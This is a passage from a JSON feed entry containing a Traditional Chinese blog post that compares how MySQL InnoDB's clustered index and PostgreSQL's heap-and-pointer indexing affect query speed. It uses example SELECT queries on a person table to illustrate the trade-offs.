balance 而發生樹的結構的變化，因為clustered index 必須反映實際物理位置，所以 clustered index 順序更新必須同時更新 disk 中的資料位置, 造成大量的時間消耗）</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__fHXzicHiDkxS1uTE.png\" alt=\"\"></p>\n<p>正是因為資料位置的不變的特性，讓 PostgreSQL 的指標實現成為可能。所以在PostgreSQL 中，用 Non-clustered index 查詢資料，不需要再跑去 clustered index tree 裡面查詢，直接拿指標位置去 storage 裡面對應的 Page 取出資料即可。</p>\n<p>然而這樣的設計並非沒有 Trade-Off 的。</p>\n<p>儘管在用 Non-clustered Index 進行 <strong>SELECT *</strong> 之類的查詢時會因為少一次tree lookup 而有效率上的提升。但因為這種實現方式完全捨棄了 clustered-index，所以如果是用 primary key（以Innodb 來說就是 clustered index ） 來查詢， 反而會多了一個用指標查詢的步驟。</p>\n<p>且因為 Heap 沒有辦法保證任何資料在物理上的 Locality（在前面提過, clustered index 才有辦法保證 index 跟 storage 中物理位置的相似性），所以無法像 MySQL-Innodb 一樣以 clustered-index 進行 Range Query 時有Locality的優勢。</p>\n<p>綜上所述，我們大致可以把這兩種資料庫實現Indexing的方式用以下幾點歸納：</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__ZXKx4__FyY7rop1wV.png\" alt=\"\"></p>\n<p>以剛剛包含了 id、 Name 跟 Height 的 table (person) 為例 ：（當然以下的前提都是資料的 rows 非常非常多的狀況，且我們把 id、Name、 Height 都 create Index）</p>\n<p>SELECT p.*<br>\nFROM person p<br>\nWHERE p.Height &lt; 170;</p>\n<p>對這樣的指令來說， 因為要 Select 全部的欄位， 而查詢條件是 non-clustered index, 所以根據我們前面所說，因為 MySQL-Innodb 還必須去 clustered index tree 裡面搜尋一遍，是可以預期 PostgreSQL 是比較快的。</p>\n<p>SELECT p.*<br>\nFROM person p<br>\nWHERE <a href=\"http://p.id\">p.id</a> &gt; 18;</p>\n<p>這個指令，儘管要 Select 全部的欄位,但因為 id 是 clustered index， 用id來當作查詢條件時對 Innodb 來說就直接在 clusterd index tree 裡面搜尋了，找到就可直接回傳。而對 PostgreSQL 來說因為id仍然是 non-clusterd index (跟 Heap 分開的)， 所以 PostgreSQL 反而還會多了一次用指標去資料庫把資料撈出來的步驟。 因此這樣的操作是可以預期 MySQL 是有優勢的。</p>\n<p>SELECT <a href=\"http://p.Name\">p.Name</a><br>\nFROM person p<br>\nWHERE <a href=\"http://p.Name\">p.Name</a> = &quot;David&quot;;</p>\n<p>至於這個指令，因為要回傳的 column 就是 non-clustered index，所以不論是Innodb 還是 PostgreSQL 都只要在查詢 non-clustered index tree 時直接回傳Name 就好了， 跟 Clustered Index tree 和 Heap 都沒關係，所以兩者的資料儲存方式不同不會讓這樣的查詢有太大效能差異。</p>\n<h4 id=\"%E7%B5%90%E8%AB%96-%3A\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96-%3A\">#</a> 結論 :</h4>\n<p>一般來說如果用 Primary Key 來查詢時，因為 MySQL-Innodb 是用 Clustered-index， 所以速度較快，尤其在進行 Range Query 時因為 clustered-index在Storage 中的 locality，所以速度會大幅提升。</p>\n<p>而如果是需要經常對不同欄位進行檢索的 Table， 因為 PostgreSQL 在 non-clustered index 的資料結構的節點中有直接存放實際資料的位置，所以速度會比起要再次去 clustered index 資料結構查詢的 MySQL-Innodb來的快。</p>\n<p>另外，當要 select 的欄位全部都被 include 在 non-clustered index 的資料結構中時，理論上兩者的效率便不會有太大的差別。（不過， INCLUDE clause只支援 PostgreSQL11 以後的版本，因此如果 PostgreSQL 沒有 INCLUDE 的話Innodb 還是會快一些的）</p>\n",
      "date_published": "2021-03-12T00:00:00-00:00"
    }
  ]
}
